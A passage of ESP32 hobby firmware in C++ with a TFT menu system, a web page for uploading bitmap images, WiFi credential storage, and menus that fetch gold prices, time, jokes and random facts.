      for (int i = 0; i < HISTORY_SIZE; i++) {
        packetHistory[i] = 0;
      }
      delay(200);
    }
    
    if (rightState == LOW && currentChannel < 14) {
      currentChannel++;
      // Clear history when changing channels
      for (int i = 0; i < HISTORY_SIZE; i++) {
        packetHistory[i] = 0;
      }
      delay(200);
    }
    
    // Long press select to exit
    if (selectState == LOW) {
      unsigned long pressStart = millis();
      while (digitalRead(BTN_SELECT) == LOW) {
        if (millis() - pressStart > LONG_PRESS_DELAY) {
          // Clean up WiFi
          WiFi.scanDelete();
          WiFi.mode(WIFI_OFF);
          
          // Return to main menu
          drawMenu();
          return;
        }
      }
    }
    
    delay(10);
  }
}

// HTML for the upload page - split into parts for better compiler handling
const char upload_html[] PROGMEM = R"rawliteral(
<!DOCTYPE html>
<html>
<head>
    <title>ESP32 Image Data</title>
    <style>
        body { font-family: Arial; text-align: center; margin: 20px; }
        textarea { width: 90%; height: 200px; margin: 10px; }
    </style>
</head>
<body>
    <h2>Paste 160x80 Bitmap Data</h2>
    <textarea id="imageData" placeholder="Paste your uint16_t bitmap array here..."></textarea>
    <br>
    <button onclick="sendData()">Display Image</button>
    
    <script>
        function sendData() {
            const data = document.getElementById('imageData').value;
            // Remove all whitespace and split by commas
            const numbers = data.replace(/\s+/g, '').split(',');
            
            if (numbers.length != 12800) { // 160 * 80
                alert('Data must contain exactly 12800 values (160x80 pixels)');
                return;
            }
            
            const uint16Array = new Uint16Array(numbers.map(n => parseInt(n)));
            
            fetch('/upload', {
                method: 'POST',
                body: uint16Array.buffer
            })
            .then(response => response.text())
            .then(result => alert('Image data sent successfully!'))
            .catch(error => alert('Failed to send data!'));
        }
    </script>
</body>
</html>
)rawliteral";

void handleUpload() {
    if (server.method() != HTTP_POST) {
        server.send(405, "text/plain", "Method Not Allowed");
        return;
    }
    
    if (server.hasArg("plain")) {
        memcpy(uploadedImage, server.arg("plain").c_str(), 160 * 80 * 2);
        imageReceived = true;
        server.send(200, "text/plain", "OK");
    } else {
        server.send(400, "text/plain", "No data received");
    }
}




void webImgMenu() {
    // Start WiFi AP
    WiFi.mode(WIFI_AP);
    WiFi.softAP(ap_ssid, ap_password);
    
    // Start web server
    server.on("/", HTTP_GET, []() {
        server.send(200, "text/html", upload_html);
    });
    server.on("/upload", HTTP_POST, handleUpload);
    server.begin();
    
    // Show WiFi credentials
    tft.fillScreen(BACKGROUND_COLOR);
    tft.setTextColor(PRIMARY_TEXT_COLOR);
    tft.setTextSize(1);
    tft.setCursor(5, 5);
    tft.println("WiFi Network:");
    tft.println(ap_ssid);
    tft.println("\nPassword:");
    tft.println(ap_password);
    tft.println("\nIP Address:");
    tft.println(WiFi.softAPIP().toString());
    tft.println("\nWaiting for bitmap data...");
    
    while (true) {
        server.handleClient();
        
        if (imageReceived) {
            // Clear screen and display image
            tft.fillScreen(BACKGROUND_COLOR);
            
            // Draw the received image
            for (int y = 0; y < 80; y++) {
                for (int x = 0; x < 160; x++) {
                    tft.drawPixel(x, y, uploadedImage[y * 160 + x]);
                }
            }
            imageReceived = false;
        }
        
        // Check for long press to exit
        if (digitalRead(BTN_SELECT) == LOW) {
            unsigned long pressStart = millis();
            while (digitalRead(BTN_SELECT) == LOW) {
                if (millis() - pressStart > LONG_PRESS_DELAY) {
                    // Clean up
                    server.stop();
                    WiFi.softAPdisconnect(true);
                    WiFi.mode(WIFI_OFF);
                    drawMenu();
                    return;
                }
            }
        }
        
        delay(10);
    }
}

void saveWiFiCredentials(const String& ssid, const String& password) {
    preferences.begin("wifi", false);
    preferences.putString("ssid", ssid);
    preferences.putString("password", password);
    preferences.end();
}

// Function to load WiFi credentials
WiFiCreds loadWiFiCredentials() {
    WiFiCreds creds;
    preferences.begin("wifi", true);
    creds.ssid = preferences.getString("ssid", "");
    creds.password = preferences.getString("password", "");
    preferences.end();
    return creds;
}

// Function to connect to stored WiFi
bool connectToStoredWiFi() {
    WiFiCreds creds = loadWiFiCredentials();
    if (creds.ssid.isEmpty() || creds.password.isEmpty()) {
        return false;
    }

    WiFi.begin(creds.ssid.c_str(), creds.password.c_str());
    
    // Wait for connection with timeout
    int attempts = 0;
    while (WiFi.status() != WL_CONNECTED && attempts < 20) {
        delay(500);
        attempts++;
    }
    
    return WiFi.status() == WL_CONNECTED;
}

const char* wifi_config_html = R"(
<!DOCTYPE html>
<html>
<head><title>WiFi Config</title></head>
<body>
<h1>WiFi Configuration</h1>
<form action="/wifi" method="POST">
SSID: <input type="text" name="ssid"><br>
Password: <input type="password" name="password"><br>
<input type="submit" value="Save">
</form>
</body>
</html>
)";

// Modified WiFi config menu with credential storage
void wifiConfigMenu() {
    // Start WiFi AP
    WiFi.mode(WIFI_AP);
    WiFi.softAP("ESP32_Config", "12345678");
    
    WebServer configServer(80);
    
    configServer.on("/", HTTP_GET, [&]() {
        configServer.send(200, "text/html", wifi_config_html);
    });
    
    configServer.on("/updatewifi", HTTP_POST, [&]() {
        String data = configServer.arg("plain");
        StaticJsonDocument<200> doc;
        DeserializationError error = deserializeJson(doc, data);
        
        if (!error) {
            String ssid = doc["ssid"].as<String>();
            String password = doc["password"].as<String>();
            saveWiFiCredentials(ssid, password);
            configServer.send(200, "text/plain", "Credentials saved successfully");
        } else {
            configServer.send(400, "text/plain", "Invalid data format");
        }
    });
    
    configServer.begin();
    
    // Show AP details on screen
    tft.fillScreen(BACKGROUND_COLOR);
    tft.setTextColor(PRIMARY_TEXT_COLOR);
    tft.setTextSize(1);
    tft.setCursor(5, 5);
    tft.println("Connect to WiFi:");
    tft.println("ESP32_Config");
    tft.println("\nPassword:");
    tft.println("12345678");
    tft.println("\nThen visit:");
    tft.println(WiFi.softAPIP().toString());
    
    while (true) {
        configServer.handleClient();
        if (digitalRead(BTN_SELECT) == LOW) {
            unsigned long pressStart = millis();
            while (digitalRead(BTN_SELECT) == LOW) {
                if (millis() - pressStart > LONG_PRESS_DELAY) {
                    configServer.stop();
                    WiFi.softAPdisconnect(true);
                    WiFi.mode(WIFI_OFF);
                    return;
                }
            }
        }
        delay(10);
    }
}

// Gold Rate implementation
void goldRateMenu() {
    if (!connectToStoredWiFi()) {
        tft.fillScreen(BACKGROUND_COLOR);
        tft.setTextColor(TFT_RED);
        tft.setTextSize(1);
        tft.setCursor(5, 5);
        tft.println("WiFi not configured");
        delay(2000);
        return;
    }

    HTTPClient http;
    http.begin("https://api.metalpriceapi.com/v1/latest?api_key=YOUR_API_KEY&base=USD&currencies=XAU");
    int httpCode = http.GET();

    tft.fillScreen(BACKGROUND_COLOR);
    tft.setTextSize(1);
    tft.setTextColor(PRIMARY_TEXT_COLOR);

    if (httpCode == HTTP_CODE_OK) {
        String payload = http.getString();
        StaticJsonDocument<200> doc;
        deserializeJson(doc, payload);
        
        float goldPrice = doc["rates"]["XAU"];
        
        tft.setCursor(5, 5);
        tft.println("Gold Rate (USD/oz)");
        tft.setTextSize(2);
        tft.setCursor(5, 25);
        tft.print("$");
        tft.println(goldPrice, 2);
    } else {
        tft.setCursor(5, 5);
        tft.println("Failed to get gold rate");
    }
    
    http.end();
    WiFi.disconnect();
    
    delay(3000);
}

// Time implementation
void timeMenu() {
    if (!connectToStoredWiFi()) {
        tft.fillScreen(BACKGROUND_COLOR);
        tft.setTextColor(TFT_RED);
        tft.setTextSize(1);
        tft.setCursor(5, 5);
        tft.println("WiFi not configured");
        delay(2000);
        return;
    }

    configTime(0, 0, "pool.ntp.org");
    
    while (true) {
        time_t now;
        struct tm timeinfo;
        if (getLocalTime(&timeinfo)) {
            tft.fillScreen(BACKGROUND_COLOR);
            tft.setTextSize(2);
            tft.setTextColor(PRIMARY_TEXT_COLOR);
            
            // Display time
            tft.setCursor(5, 20);
            char timeStr[9];
            sprintf(timeStr, "%02d:%02d:%02d", timeinfo.tm_hour, timeinfo.tm_min, timeinfo.tm_sec);
            tft.println(timeStr);
            
            // Display date
            tft.setTextSize(1);
            tft.setCursor(5, 45);
            char dateStr[11];
            sprintf(dateStr, "%02d/%02d/%04d", timeinfo.tm_mday, timeinfo.tm_mon + 1, timeinfo.tm_year + 1900);
            tft.println(dateStr);
        }
        
        if (digitalRead(BTN_SELECT) == LOW) {
            unsigned long pressStart = millis();
            while (digitalRead(BTN_SELECT) == LOW) {
                if (millis() - pressStart > LONG_PRESS_DELAY) {
                    WiFi.disconnect();
                    return;
                }
            }
        }
        delay(1000);
    }
}

// Chuck Norris implementation
void chuckNorrisMenu() {
    if (!connectToStoredWiFi()) {
        tft.fillScreen(BACKGROUND_COLOR);
        tft.setTextColor(TFT_RED);
        tft.setTextSize(1);
        tft.setCursor(5, 5);
        tft.println("WiFi not configured");
        delay(2000);
        return;
    }

    HTTPClient http;
    http.begin("https://api.chucknorris.io/jokes/random");
    int httpCode = http.GET();

    tft.fillScreen(BACKGROUND_COLOR);
    tft.setTextSize(1);
    tft.setTextColor(PRIMARY_TEXT_COLOR);

    if (httpCode == HTTP_CODE_OK) {
        String payload = http.getString();
        StaticJsonDocument<1024> doc;
        deserializeJson(doc, payload);
        
        String joke = doc["value"].as<String>();
        
        // Word wrap the joke
        int16_t x1, y1;
        uint16_t w, h;
        String currentLine;
        int yPos = 5;
        
        tft.setCursor(5, yPos);
        for (int i = 0; i < joke.length(); i++) {
            currentLine += joke[i];
            tft.getTextBounds(currentLine.c_str(), 0, 0, &x1, &y1, &w, &h);
            
            if (w > tft.width() - 10 || joke[i] == '\n') {
                int lastSpace = currentLine.lastIndexOf(' ');
                if (lastSpace > 0) {
                    tft.setCursor(5, yPos);
                    tft.println(currentLine.substring(0, lastSpace));
                    currentLine = currentLine.substring(lastSpace + 1);
                } else {
                    tft.setCursor(5, yPos);
                    tft.println(currentLine);
                    currentLine = "";
                }
                yPos += 10;
            }
        }
        if (currentLine.length() > 0) {
            tft.setCursor(5, yPos);
            tft.println(currentLine);
        }
    } else {
        tft.setCursor(5, 5);
        tft.println("Failed to get joke");
    }
    
    http.end();
    WiFi.disconnect();
    
    delay(5000);
}

// Followers implementation (using a mock Twitter API for example)
void followersMenu() {
    if (!connectToStoredWiFi()) {
        tft.fillScreen(BACKGROUND_COLOR);
        tft.setTextColor(TFT_RED);
        tft.setTextSize(1);
        tft.setCursor(5, 5);
        tft.println("WiFi not configured");
        delay(2000);
        return;
    }

    tft.fillScreen(BACKGROUND_COLOR);
    tft.setTextSize(1);
    tft.setTextColor(PRIMARY_TEXT_COLOR);
    tft.setCursor(5, 5);
    tft.println("Social Media Stats");
    
    // This is a mock implementation
    // You would typically make API calls to social platforms
    tft.setCursor(5, 25);
    tft.println("Twitter: 1,234");
    tft.setCursor(5, 35);
    tft.println("Instagram: 5,678");
    tft.setCursor(5, 45);
    tft.println("YouTube: 9,012");
    
    WiFi.disconnect();
    delay(3000);
}

// IDK implementation (shows random fun facts)
void idkMenu() {
    if (!connectToStoredWiFi()) {
        tft.fillScreen(BACKGROUND_COLOR);
        tft.setTextColor(TFT_RED);
        tft.setTextSize(1);
        tft.setCursor(5, 5);
        tft.println("WiFi not configured");
        delay(2000);
        return;
    }

    HTTPClient http;
    http.begin("https://uselessfacts.jsph.pl/random.json?language=en");
    int httpCode = http.GET();

    tft.fillScreen(BACKGROUND_COLOR);
    tft.setTextSize(1);
    tft.setTextColor(PRIMARY_TEXT_COLOR);

    if (httpCode == HTTP_CODE_OK) {
        String payload = http.getString();
        StaticJsonDocument<1024> doc;
        deserializeJson(doc, payload);
        
        String fact = doc["text"].as<String>();
        
        // Word wrap the fact
        int16_t x1, y1;
        uint16_t w, h;
        String currentLine;
        int yPos = 5;
        
        tft.setCursor(5, yPos);
        for (int i = 0; i < fact.length(); i++) {
            currentLine += fact[i];
            tft.getTextBounds(currentLine.c_str(), 0, 0, &x1, &y1, &w, &h);
            
            if (w > tft.width() - 10 || fact[i] == '\n') {
                int lastSpace = currentLine.lastIndexOf(' ');
                if (lastSpace > 0) {
                    tft.setCursor(5, yPos);
                    tft.println(currentLine.substring(0, lastSpace));
                    currentLine = currentLine.substring(lastSpace + 1);
                } else {
                    tft.setCursor(5, yPos);
                    tft.println(currentLine);
                    currentLine = "";
                }
                yPos += 10;
            }
        }
        if (currentLine.length() > 0) {
            tft.setCursor(5, yPos);
            tft.println(currentLine);
        }
    } else {
        tft.setCursor(5, 5);
        tft.println("Failed to get fact");
    }
    
    http.end();
    WiFi.disconnect();
    
    delay(5000);
}

const char wifi_config_html[] PROGMEM = R"rawliteral(
<!DOCTYPE html>
<html>
<head>
    <title>WiFi Configuration</title>
    <style>
        body { font-family: Arial; text-align: center; margin: 20px; }
        input { width: 200px; margin: 10px; padding: 5px; }
        button { padding: 10px 20px; margin: 10px; }
    </style>
</head>
<body>
    <h2>WiFi Configuration</h2>
    <input type="text" id="ssid" placeholder="WiFi Name"><br>
    <input type="password" id="password" placeholder="WiFi Password"><br>
    <button onclick="updateWiFi()">Update</button>
    
    <script>
        function updateWiFi() {
            const ssid = document.getElementById('ssid').value;
            const password = document.getElementById('password').value;
            
            if (!ssid || !password) {
                alert('Please fill in both fields');
                return;
            }
            
            const data = JSON.stringify({ssid, password});
            
            fetch('/updatewifi', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: data
            })
            .then(response => response.text())
            .then(result => alert('WiFi configuration updated!'))
            .catch(error => alert('Failed to update configuration!'));
        }
    </script>
</body>
</html>
)rawliteral";

// WiFi configuration menu
void wifiConfigMenu() {
    // Start WiFi AP
    WiFi.mode(WIFI_AP);
    WiFi.softAP("ESP32_Config", "12345678");
    
    // Start web server
    WebServer configServer(80);
    
    configServer.on("/", HTTP_GET, [&]() {
        configServer.send(200, "text/html", wifi_config_html);
    });
    
    configServer.on("/updatewifi", HTTP_POST, [&]() {
        String data = configServer.arg("plain");
        // Parse JSON and store WiFi credentials
        // You would typically store these in EEPROM or preferences
        configServer.send(200, "text/plain", "OK");
    });
    
    configServer.begin();
    
    // Show AP details on screen
    tft.fillScreen(BACKGROUND_COLOR);
    tft.setTextColor(PRIMARY_TEXT_COLOR);
    tft.setTextSize(1);
    tft.setCursor(5, 5);
    tft.println("Connect to WiFi:");
    tft.println("ESP32_Config");
    tft.println("\nPassword:");
    tft.println("12345678");
    tft.println("\nThen visit:");
    tft.println(WiFi.softAPIP().toString());
    
    while (true) {
        configServer.handleClient();
        
        // Check for long press to exit
        if (digitalRead(BTN_SELECT) == LOW) {
            unsigned long pressStart = millis();
            while (digitalRead(BTN_SELECT) == LOW) {
                if (millis() - pressStart > LONG_PRESS_DELAY) {
                    // Clean up
                    configServer.stop();
                    WiFi.softAPdisconnect(true);
                    WiFi.mode(WIFI_OFF);
                    return;
                }
            }
        }
        delay(10);
    }
}

// Internet menu implementation
void internetMenu() {
    int currentInternetIndex = 0;
    bool needRedraw = true;

    while (true) {
        if (needRedraw) {
            tft.fillScreen(BACKGROUND_COLOR);
            tft.setTextSize(1);
            
            // Display title
            tft.fillRect(0, 0, tft.width(), 10, ACCENT_COLOR);
            tft.setCursor(5, 2);
            tft.setTextColor(PRIMARY_TEXT_COLOR);
            tft.println("Internet Services");

            // Display menu items
            for (int i = 0; i < NUM_INTERNET_OPTIONS; i++) {
                int yPos = 20 + (i * 10);
                
                if (i == currentInternetIndex) {
                    tft.fillRect(0, yPos - 1, tft.width(), 10, tft.color565(100, 200, 255));
                    tft.setTextColor(BACKGROUND_COLOR);
                } else {
                    tft.setTextColor(PRIMARY_TEXT_COLOR);
                }
                
                tft.setCursor(5, yPos);
                tft.println(internetMenuItems[i].name);
            }
            
            needRedraw = false;
        }

        // Button handling
        if (digitalRead(BTN_LEFT) == LOW) {
            currentInternetIndex = (currentInternetIndex - 1 + NUM_INTERNET_OPTIONS) % NUM_INTERNET_OPTIONS;
            needRedraw = true;
            delay(200);
        }
        
        if (digitalRead(BTN_RIGHT) == LOW) {
            currentInternetIndex = (currentInternetIndex + 1) % NUM_INTERNET_OPTIONS;
            needRedraw = true;
            delay(200);
        }
        
        if (digitalRead(BTN_SELECT) == LOW) {
            unsigned long pressStart = millis();
            while (digitalRead(BTN_SELECT) == LOW) {
                if (millis() - pressStart > LONG_PRESS_DELAY) {
                    drawMenu();
                    return;
                }
            }
            // Execute selected menu item's action
            internetMenuItems[currentInternetIndex].action();
            needRedraw = true;
        }
        
        delay(10);
    }
}
